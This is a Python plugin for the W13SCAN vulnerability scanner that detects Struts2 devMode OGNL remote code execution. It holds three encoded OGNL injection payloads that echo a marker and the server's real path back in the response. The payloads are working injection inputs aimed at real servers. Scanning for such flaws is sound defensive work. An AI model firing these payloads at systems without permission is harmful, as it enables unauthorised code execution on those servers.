# coding   :utf-8
# file     : struts2_dev.py
# author   : go0p
# time     : 2019/8/18 7:09 PM
# software :PyCharm


import copy
import os
import random
import requests

from W13SCAN.lib.common import prepare_url
from W13SCAN.lib.const import acceptedExt, ignoreParams, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'Struts2-Dev远程代码执行'
    desc = ''''''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL
        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if self.response.language and self.response.language != "JAVA":
            return

        if method == 'GET':
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return

            check = '<Struts2-vuln-Check>'
            payloads = [
                r"debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().print(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D)))(#context[#parameters.rpsobj[0]].getWriter().print('Check>')):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=<Struts2-vuln-&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest",
                r"debug=browser&object=%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2c%23res%3d@org.apache.struts2.ServletActionContext@getResponse%28%29%2c%23w%3d%23res.getWriter%28%29%2c%23w.print%28%27<Struts2-vuln%27%2b%27-Check>%27%29%29",
                r"debug=browser&object=(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),%23w.print('Check>'))&pp=Struts2-vuln-"
            ]
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            for payload in payloads:
                r1 = requests.post(url, headers=headers, data=payload)
                if check in r1.text:
                    out.success(url, self.name, playload="{}".format(payload), method="POST", check=check, raw=r1.raw)
                    return
                r2 = requests.get(netloc + '?' + payload, headers=headers, )
                if check in r2.text:
                    out.success(url, self.name, playload="{}".format(payload), method="GET", check=check, raw=r2.raw)
                    return
